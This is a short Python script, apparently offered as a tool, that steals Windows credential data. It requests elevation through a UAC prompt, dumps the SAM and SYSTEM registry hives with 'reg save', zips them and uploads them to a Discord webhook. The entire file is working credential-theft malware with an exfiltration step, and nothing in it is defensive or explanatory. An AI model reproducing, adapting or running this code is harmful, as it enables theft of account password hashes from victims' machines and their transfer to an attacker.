
# Author:  mrpanda_bamboo
# Version: 1.0
# License: MIT

import os
import sys
import ctypes
import subprocess
import zipfile
import requests
import time
import shutil

WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
WORKING_DIR = "C:\\Users\\Public\\Documents\\SysData"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def send_file(file_path):
    with open(file_path, 'rb') as f:
        requests.post(WEBHOOK_URL, files={'file': f}, timeout=60)

def exfiltrate():
    if os.path.exists(WORKING_DIR):
        shutil.rmtree(WORKING_DIR, ignore_errors=True)
    os.makedirs(WORKING_DIR, exist_ok=True)

    sam_bak = os.path.join(WORKING_DIR, "SAM.dat")
    sys_bak = os.path.join(WORKING_DIR, "SYSTEM.dat")
    sam_zip = os.path.join(WORKING_DIR, "SAM.zip")
    sys_zip = os.path.join(WORKING_DIR, "SYSTEM.zip")

    subprocess.run(f'reg save HKLM\\SAM "{sam_bak}" /y', shell=True, capture_output=True)
    subprocess.run(f'reg save HKLM\\SYSTEM "{sys_bak}" /y', shell=True, capture_output=True)
    
    time.sleep(2)

    if os.path.exists(sam_bak):
        with zipfile.ZipFile(sam_zip, 'w', zipfile.ZIP_DEFLATED) as z:
            z.write(sam_bak, "SAM")
        send_file(sam_zip)

    if os.path.exists(sys_bak):
        with zipfile.ZipFile(sys_zip, 'w', zipfile.ZIP_DEFLATED) as z:
            z.write(sys_bak, "SYSTEM")
        send_file(sys_zip)

if __name__ == "__main__":
    if is_admin():
        exfiltrate()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 0)
        sys.exit()
